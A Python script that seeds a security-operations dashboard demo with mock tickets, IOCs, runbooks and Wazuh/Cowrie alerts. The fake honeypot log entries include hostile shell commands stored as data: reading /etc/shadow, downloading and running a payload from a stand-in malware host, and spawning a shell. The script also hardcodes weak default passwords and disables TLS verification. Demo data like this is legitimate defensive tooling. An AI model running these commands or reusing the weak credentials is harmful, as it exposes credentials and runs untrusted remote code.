import asyncio
import httpx
import json
from datetime import datetime, timedelta, timezone
import random
import uuid
from sqlalchemy import select, delete
from app.db import SessionLocal
from app.models import (
    User, Ticket, AuditLog, IOC, Monitor, Runbook, 
    SystemSetting, ChatMessage, Evidence
)
from app.auth import get_password_hash

# OpenSearch Configuration
OS_URL = "https://wazuh.indexer:9200"
OS_USER = "admin"
OS_PASS = "admin"
INDEX_NAME = f"wazuh-alerts-4.x-demo-{datetime.now().strftime('%Y.%m.%d')}"

async def populate_postgres():
    print("Populating PostgreSQL with comprehensive demo data...")
    async with SessionLocal() as db:
        # 1. Users
        admin_res = await db.execute(select(User).where(User.username == "admin"))
        admin = admin_res.scalar_one_or_none()
        if not admin:
            admin = User(
                username="admin",
                email="admin@valhalla.soc",
                password_hash=get_password_hash("Admin123!"),
                role="admin",
                security_rank="Commander"
            )
            db.add(admin)
            await db.commit()
            await db.refresh(admin)

        # 2. Monitors
        await db.execute(delete(Monitor))
        db.add_all([
            Monitor(name="SSH Bruteforce", threshold=5, severity_floor="high", rule_id_pattern="5710,5712", enabled=True),
            Monitor(name="Web Attack Detection", threshold=10, severity_floor="high", rule_id_pattern="31103", enabled=True),
            Monitor(name="Malware Execution", threshold=1, severity_floor="critical", rule_id_pattern="100001", enabled=True),
            Monitor(name="Lateral Movement", threshold=2, severity_floor="high", rule_id_pattern="40001", enabled=True),
        ])

        # 3. Audit Logs
        await db.execute(delete(AuditLog))
        actions = [
            ("Login", "/api/auth/login", "192.168.1.100"),
            ("Create Ticket", "/api/tickets", "192.168.1.100"),
            ("Update Monitor", "/api/monitors/1", "192.168.1.100"),
            ("Export Report", "/api/reports/executive", "192.168.1.100"),
            ("Delete IOC", "/api/ioc/5", "192.168.1.100"),
        ]
        for act, route, ip in actions:
            db.add(AuditLog(user_id=admin.id, username=admin.username, action=act, route=route, ip_address=ip))

        # 4. IOCs (Threat Intel)
        await db.execute(delete(IOC))
        db.add_all([
            IOC(value="45.33.32.156", ioc_type="ip", malicious_score=85, total_engines=70, country="CN", status="active", analyst_notes="Known SSH brute forcer"),
            IOC(value="evil-domain.com", ioc_type="domain", malicious_score=90, total_engines=65, status="active", analyst_notes="C2 server for Cobalt Strike"),
            IOC(value="5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8", ioc_type="hash", malicious_score=100, total_engines=55, status="mitigated", analyst_notes="Emotet payload"),
        ])

        # 5. Runbooks
        await db.execute(delete(Runbook))
        db.add_all([
            Runbook(
                name="Ransomware Containment", 
                category="Malware", 
                description="Procedimiento para aislar activos infectados por ransomware.",
                severity_applicable="critical",
                created_by_id=admin.id,
                identification_steps=["Check encryption alerts", "Identify source PID"],
                containment_steps=["Isolate network", "Disable compromised accounts"]
            ),
            Runbook(
                name="Phishing Analysis", 
                category="Email", 
                description="Guía paso a paso para analizar correos sospechosos.",
                severity_applicable="medium",
                created_by_id=admin.id,
                identification_steps=["Extract headers", "Check URL in VirusTotal"]
            ),
            Runbook(
                name="DDoS Mitigation", 
                category="Network", 
                description="Acciones para mitigar ataques de denegación de servicio.",
                severity_applicable="high",
                created_by_id=admin.id,
                identification_steps=["Identify target IP", "Analyze traffic volume"],
                containment_steps=["Enable Cloudflare Under Attack mode", "Apply rate limiting"]
            ),
            Runbook(
                name="Insider Threat Investigation", 
                category="Internal", 
                description="Procedimiento de auditoría para detectar fugas de datos internas.",
                severity_applicable="high",
                created_by_id=admin.id,
                identification_steps=["Review file access logs", "Check outbound traffic for large transfers"]
            )
        ])

        # 6. Tickets (Workspace)
        await db.execute(delete(Ticket))
        db.add_all([
            Ticket(
                title="Detección de Ransomware: SRV-DB-PROD",
                description="Se ha detectado actividad inusual de cifrado masivo de archivos (comportamiento ransomware). Proceso sospechoso: powershell.exe -enc ...",
                severity="critical",
                status="open",
                category="Malware",
                affected_asset="SRV-DB-PROD",
                source_ip="185.220.101.12",
                reporter_id=admin.id,
                ai_summary="Ataque de Ransomware en curso. El atacante ha comprometido el servidor de base de datos.",
                ai_recommendation="Aislar el servidor SRV-DB-PROD de la red inmediatamente. Ejecutar el Runbook de Ransomware Containment."
            ),
            Ticket(
                title="Intento de Exfiltración de Datos: S3 Bucket",
                description="Anomalía de tráfico detectada hacia un bucket de S3 externo no autorizado. Volumen: 4.2GB en 10 minutos.",
                severity="high",
                status="in_progress",
                category="Intrusión",
                affected_asset="AWS-Gateway-01",
                source_ip="10.0.5.122",
                assigned_to_id=admin.id,
                reporter_id=admin.id,
                ai_summary="Posible fuga de información sensible hacia un destino en la nube desconocido.",
                ai_recommendation="Bloquear el tráfico saliente hacia el destino detectado y revisar los logs de acceso de IAM."
            ),
            Ticket(
                title="Fuerza Bruta SSH Persistente: Honeypot-01",
                description="Más de 5,000 intentos fallidos de login detectados desde la misma subred en la última hora.",
                severity="medium",
                status="open",
                category="Intrusión",
                affected_asset="Valhalla-Honey-SSH",
                source_ip="45.33.32.156",
                reporter_id=admin.id,
                ai_summary="Escaneo de puertos masivo seguido de ataque de diccionario SSH.",
                ai_recommendation="Añadir la IP 45.33.32.156 a la lista de bloqueo de Threat Intel (MISP/VirusTotal)."
            ),
            Ticket(
                title="Phishing Reportado: CEO Office",
                description="El usuario CEO reporta un correo sospechoso pidiendo credenciales de Microsoft 365.",
                severity="high",
                status="open",
                category="Phishing",
                affected_asset="WKST-CEO-01",
                affected_user="CEO",
                reporter_id=admin.id,
                ai_summary="Campaña de Spear Phishing dirigida a altos ejecutivos.",
                ai_recommendation="Eliminar el correo de todos los buzones y forzar el cambio de contraseña con MFA para el usuario afectado."
            )
        ])

        await db.commit()
    print("PostgreSQL data populated.")

async def populate_opensearch():
    print("Populating OpenSearch with mock Wazuh alerts...")
    async with httpx.AsyncClient(auth=(OS_USER, OS_PASS), verify=False) as client:
        bulk_data = []
        now = datetime.now(timezone.utc)
        
        geo_data = {
            "45.33.32.156": {"country": "CN", "name": "China", "city": "Beijing", "lat": 39.9042, "lon": 116.4074},
            "185.220.101.12": {"country": "RU", "name": "Russia", "city": "Moscow", "lat": 55.7558, "lon": 37.6173},
            "103.21.244.0": {"country": "US", "name": "USA", "city": "New York", "lat": 40.7128, "lon": -74.0060},
            "91.108.4.0": {"country": "NL", "name": "Netherlands", "city": "Amsterdam", "lat": 52.3676, "lon": 4.9041},
            "190.115.18.2": {"country": "IR", "name": "Iran", "city": "Tehran", "lat": 35.6892, "lon": 51.3890},
            "177.55.22.1": {"country": "BR", "name": "Brazil", "city": "Sao Paulo", "lat": -23.5505, "lon": -46.6333},
            "1.33.2.1": {"country": "JP", "name": "Japan", "city": "Tokyo", "lat": 35.6762, "lon": 139.6503},
            "101.167.0.1": {"country": "AU", "name": "Australia", "city": "Sydney", "lat": -33.8688, "lon": 151.2093},
            "81.2.69.142": {"country": "GB", "name": "United Kingdom", "city": "London", "lat": 51.5074, "lon": -0.1278},
            "62.138.0.1": {"country": "DE", "name": "Germany", "city": "Berlin", "lat": 52.5200, "lon": 13.4050},
            "189.240.0.1": {"country": "MX", "name": "Mexico", "city": "Mexico City", "lat": 19.4326, "lon": -99.1332},
            "24.48.0.1": {"country": "CA", "name": "Canada", "city": "Montreal", "lat": 45.5017, "lon": -73.5673}
        }
        ips = list(geo_data.keys())

        # 1. SIEM & Overview
        for i in range(80):
            ip = random.choice(ips)
            geo = geo_data[ip]
            ts = (now - timedelta(minutes=random.randint(1, 2880))).strftime('%Y-%m-%dT%H:%M:%S.%fZ')
            level = random.randint(3, 15)
            
            doc = {
                "@timestamp": ts,
                "rule": {
                    "id": str(random.randint(10000, 99999)),
                    "level": level,
                    "description": f"Demo Alert {level}: {random.choice(['Brute Force', 'SQL Injection', 'Malware Detected', 'Suspicious Login'])}",
                    "groups": ["syslog", "sshd", "web"],
                    "mitre": {
                        "id": "T1110",
                        "tactic": "Initial Access",
                        "technique": "Brute Force"
                    }
                },
                "agent": {"id": "001", "name": "SRV-WEB-01"},
                "data": {
                    "srcip": ip,
                    "geoip": {
                        "country_code2": geo["country"],
                        "country_name": geo["name"],
                        "city_name": geo["city"],
                        "latitude": geo["lat"],
                        "longitude": geo["lon"]
                    }
                }
            }
            bulk_data.append(json.dumps({"index": {"_index": INDEX_NAME}}))
            bulk_data.append(json.dumps(doc))

        # 2. Cowrie Honeypot
        cowrie_inputs = [
            "cat /etc/shadow", "wget http://malware.com/payload.sh", 
            "chmod +x payload.sh", "./payload.sh", "uname -a", 
            "whoami", "ls -la", "cd /tmp", "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
        ]
        for i in range(50):
            ip = random.choice(ips)
            geo = geo_data[ip]
            ts = (now - timedelta(minutes=random.randint(1, 1440))).strftime('%Y-%m-%dT%H:%M:%S.%fZ')
            doc = {
                "@timestamp": ts,
                "rule": {"id": "100001", "level": 10, "description": "Cowrie: Command Executed", "groups": ["cowrie"]},
                "decoder": {"name": "cowrie"},
                "data": {
                    "srcip": ip,
                    "session": str(uuid.uuid4())[:8],
                    "input": random.choice(cowrie_inputs),
                    "geoip": {
                        "country_code2": geo["country"],
                        "country_name": geo["name"],
                        "city_name": geo["city"],
                        "latitude": geo["lat"],
                        "longitude": geo["lon"]
                    }
                }
            }
            bulk_data.append(json.dumps({"index": {"_index": INDEX_NAME}}))
            bulk_data.append(json.dumps(doc))

        # 3. MITRE Coverage Variation
        mitre_data = [
            ("T1059", "Execution", "Command and Scripting Interpreter"),
            ("T1566", "Initial Access", "Phishing"),
            ("T1003", "Credential Access", "OS Credential Dumping"),
            ("T1021", "Lateral Movement", "Remote Services"),
            ("T1486", "Impact", "Data Encrypted for Impact")
        ]
        for i in range(30):
            tech_id, tactic, tech_name = random.choice(mitre_data)
            ip = random.choice(ips)
            geo = geo_data[ip]
            ts = (now - timedelta(minutes=random.randint(1, 100))).strftime('%Y-%m-%dT%H:%M:%S.%fZ')
            doc = {
                "@timestamp": ts,
                "rule": {
                    "id": str(random.randint(20000, 30000)),
                    "level": 12,
                    "description": f"MITRE {tech_id}: {tech_name}",
                    "groups": ["mitre", "attack"],
                    "mitre": {
                        "id": [tech_id],
                        "tactic": [tactic],
                        "technique": [tech_name]
                    }
                },
                "agent": {"id": "002", "name": "SRV-APP-01"},
                "data": {
                    "srcip": ip,
                    "geoip": {
                        "country_code2": geo["country"],
                        "country_name": geo["name"],
                        "city_name": geo["city"],
                        "latitude": geo["lat"],
                        "longitude": geo["lon"]
                    }
                }
            }
            bulk_data.append(json.dumps({"index": {"_index": INDEX_NAME}}))
            bulk_data.append(json.dumps(doc))

        bulk_str = "\n".join(bulk_data) + "\n"
        res = await client.post(f"{OS_URL}/_bulk", headers={"Content-Type": "application/x-ndjson"}, content=bulk_str)
        if res.status_code in [200, 201]:
            print(f"Successfully injected {len(bulk_data)//2} alerts into OpenSearch.")
            await client.post(f"{OS_URL}/{INDEX_NAME}/_refresh")
        else:
            print(f"OpenSearch injection failed: {res.status_code} {res.text}")

async def main():
    await populate_postgres()
    await populate_opensearch()
    print("DEMO POPULATION COMPLETE.")

if __name__ == "__main__":
    asyncio.run(main())
